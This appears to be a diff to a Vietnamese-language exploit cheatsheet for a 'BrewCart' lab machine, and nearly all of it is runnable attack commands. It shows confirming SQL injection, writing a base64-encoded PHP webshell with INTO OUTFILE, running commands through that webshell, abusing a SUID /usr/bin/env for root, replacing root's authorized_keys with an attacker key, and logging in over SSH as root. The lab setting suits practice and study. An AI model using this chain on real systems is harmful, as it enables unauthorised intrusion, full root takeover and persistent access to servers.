@@ -1,29 +1,40 @@
-1. Gán URL 
-export BASE="http://localhost:3000"
-2. Xác nhận SQL  
-curl -s "$BASE/product?id=1'" | grep SQL 
-3. Thêm file php 
+# ============================================================
+# BREWCART LAB — MANUAL 10-STEP EXPLOIT CHEATSHEET
+# Chạy trực tiếp trên máy ảo Kali Linux (192.168.245.128)
+# ============================================================
+
+1. Gán URL và cổng SSH của máy chủ mục tiêu
+export BASE="http://192.168.245.128:3000"
+export TARGET_IP="192.168.245.128"
+export SSH_PORT="22"
+
+2. Xác nhận điểm chèn SQL Injection
+curl -s "$BASE/product?id=1'" | grep -iE "SQL|MariaDB"
+
+3. Khai thác SQLi INTO OUTFILE ghi webshell PHP
 curl -s -G "$BASE/product" --data-urlencode "id=-1 UNION SELECT FROM_BASE64('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg=='),'','','' INTO OUTFILE '/app/uploads/shell3.py.php'-- -"
-4. Test webshell 
+
+4. Kiểm tra webshell hoạt động (quyền www-data)
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=id"
-5. Kiểm tra SUID 
+
+5. Kiểm tra binary SUID /usr/bin/env (euid=0)
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env id"
-6. Tạo key 
+
+6. Tạo cặp khóa SSH RSA trên máy tấn công
 ssh-keygen -t rsa -b 2048 -f ./lab_key -N ""
 EXPORT_B64=$(cat ./lab_key.pub | base64 -w 0)
-7. Đẩy key 
+
+7. Đẩy Public Key vào /tmp/k.pub qua webshell
 curl -s -X POST "$BASE/uploads/shell3.py.php" \
   -d "cmd=sh -c \"echo '$EXPORT_B64' | base64 -d > /tmp/k.pub\""
-8. Xem ghi đúng key vô tmp chưa 
+
+8. Xác nhận file key đã ghi đúng vào /tmp
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=cat /tmp/k.pub"
-9. Đẩy tmp vô root 
+
+9. Leo thang đặc quyền cài đặt key vào /root/.ssh/authorized_keys
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env rm -f /root/.ssh/authorized_keys"
-
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env install -D -m 600 /tmp/k.pub /root/.ssh/authorized_keys"
-
 curl -s -X POST "$BASE/uploads/shell3.py.php" -d "cmd=/usr/bin/env cat /root/.ssh/authorized_keys"
 
-10. Kết nối thử ssh 
-
-ssh -i ./lab_key -p 2022 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
-
+10. Kết nối SSH chiếm quyền Root Shell
+ssh -i ./lab_key -p $SSH_PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@$TARGET_IP
